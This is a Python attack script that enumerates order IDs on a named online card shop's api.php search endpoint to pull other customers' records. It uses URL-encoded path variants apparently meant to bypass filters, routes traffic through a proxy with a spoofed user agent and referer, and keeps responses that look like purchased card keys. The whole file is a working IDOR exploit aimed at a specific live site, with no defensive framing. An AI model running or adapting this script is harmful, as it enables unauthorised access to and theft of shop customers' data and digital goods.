#!/usr/bin/env python3
"""Full api IDOR scan for small-order rainbow sites."""
import json
import os
import subprocess
import sys
import time

BASE = os.environ.get("BASE", "https://kangsfqq.top/shop/")
if not BASE.endswith("/"):
    BASE += "/"
MAX_ID = int(sys.argv[1]) if len(sys.argv) > 1 else 800
PROXY = os.environ.get("PROXY_URL", "")
if not PROXY and os.path.isfile("/data/config/proxy.env"):
    for line in open("/data/config/proxy.env"):
        if line.startswith("PROXY_URL="):
            PROXY = line.strip().split("=", 1)[1].strip().strip('"').strip("'")

hits = []
for oid in range(MAX_ID, 0, -1):
    for suf in ["api.php?act=search&id=", "%61pi.php/?act=search&id=", "%2561pi.php?act=search&id="]:
        url = BASE + suf + str(oid)
        cmd = [
            "curl", "-sk", "--max-time", "10", "-x", PROXY,
            "-A", "Mozilla/5.0 Chrome/120", "-e", BASE, url,
        ]
        try:
            b = subprocess.run(cmd, capture_output=True, text=True, timeout=12).stdout or ""
            if '"code":0' in b and any(x in b for x in ("km", "----", "卡", "kminfo")):
                hits.append({"id": oid, "suf": suf, "body": b[:500]})
                print(f"HIT id={oid} {suf[:20]} {b[:100]}", flush=True)
        except Exception:
            pass
    if oid % 100 == 0:
        print(f"scan {oid} hits={len(hits)}", flush=True)
    time.sleep(0.04)

out = {"base": BASE, "max_id": MAX_ID, "hits": hits}
print(json.dumps(out, ensure_ascii=False), flush=True)
with open("/tmp/kangsfqq_api_idor.json", "w", encoding="utf-8") as f:
    json.dump(out, f, ensure_ascii=False, indent=2)
